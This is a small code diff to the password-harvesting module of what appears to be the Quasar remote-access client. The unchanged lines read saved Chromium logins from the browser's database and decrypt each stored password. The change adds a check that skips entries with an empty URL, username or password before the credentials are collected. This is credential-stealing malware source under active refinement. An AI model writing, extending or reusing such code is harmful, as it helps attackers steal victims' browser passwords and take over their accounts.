@@ -40,6 +40,9 @@ namespace Quasar.Client.Kematian.Browsers.Chromium.Passwords
                         var username = sqlDatabase.GetValue(i, "username_value");
                         var password = decrypter.Decrypt(sqlDatabase.GetValue(i, "password_value"));
 
+                        if (string.IsNullOrEmpty(url) || string.IsNullOrEmpty(username) || string.IsNullOrEmpty(password))
+                            continue;
+
                         logins.Add(new LoginData(url, username, password));
                     }
                     catch (Exception ex)
